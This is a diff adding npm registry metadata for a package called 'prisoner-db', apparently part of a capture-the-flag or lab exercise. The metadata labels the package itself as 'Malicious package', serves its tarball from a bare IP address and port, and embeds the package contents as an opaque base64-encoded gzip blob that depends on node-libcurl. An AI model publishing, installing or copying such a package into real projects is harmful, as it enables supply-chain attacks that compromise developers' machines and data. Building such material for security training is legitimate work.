@@ -1,0 +1,28 @@
+{
+  "name": "prisoner-db",
+  "description": "Malicious package",
+  "dist-tags": {
+    "latest": "1.0.1"
+  },
+  "versions": {
+    "1.0.1": {
+      "name": "prisoner-db",
+      "version": "1.0.1",
+      "dist": {
+        "shasum": "9e75ebee8450da058000b8c42bb63467ca2572e1",
+        "tarball": "http://154.57.164.80:32343/prisoner-db-1.0.1.tgz"
+      },
+      "dependencies": {
+        "js-yaml": "^4.1.0",
+        "node-libcurl": "4.0.0"
+      }
+    }
+  },
+  "_attachments": {
+    "prisoner-db-1.0.1.tgz": {
+      "content_type": "application/octet-stream",
+      "data": "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",
+      "length": 1807
+    }
+  }
+}
